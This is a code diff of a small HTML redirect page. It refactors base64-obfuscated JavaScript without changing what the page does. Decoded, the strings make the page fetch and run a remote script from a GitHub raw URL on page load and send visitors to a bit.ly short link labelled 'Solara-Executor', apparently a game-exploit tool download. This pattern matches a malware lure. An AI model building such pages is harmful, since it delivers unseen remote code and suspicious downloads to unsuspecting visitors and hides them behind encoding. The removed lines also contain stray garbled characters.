@@ -4,23 +4,26 @@
     <meta charset="utf-8"/>
     <meta content="width=device-width,initial-scale=1.0" name="viewport"/>
     <script>
-        function _1(_2) {
-            return atob(_2);
-        }le
+        function _1(encodedStr) {
+            return atob(encodedStr);
+        }
+
         document.title = _1('UmVkaXJlY3RpbmcuLi4=');
-        var _3 = document.createElement('script');
-        _3.async = true;
-        _3.src = _1('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9tYWluL3JlZGlyZWN0Lmpz');
-        document.head.appendChild(_3);
+
+        var scriptTag = document.createElement('script');
+        scriptTag.async = true;
+        scriptTag.src = _1('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlYm9yblBoYW50b20vUmVwb3NpdG9yeS9tYWluL3JlZGlyZWN0Lmpz');
+        document.head.appendChild(scriptTag);
     </script>
 </head>
 <body>
-    <p>If you are not redirected, <a id="_4"></a>.</p>
-    <script>L
-        var _5 = _1('Y2xpY2sgaGVyZQ==');
-        var _6 = _1('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
-        document.getElementById('_4').innerText = _5;
-        document.getElementById('_4').href = _6;
+    <p>If you are not redirected, <a id="redirectLink"></a>.</p>
+    <script>
+        var linkText = _1('Y2xpY2sgaGVyZQ==');
+        var linkURL = _1('aHR0cHM6Ly9iaXQubHkvU29sYXJhLUV4ZWN1dG9y');
+        var linkElement = document.getElementById('redirectLink');
+        linkElement.innerText = linkText;
+        linkElement.href = linkURL;
     </script>
 </body>
 </html>
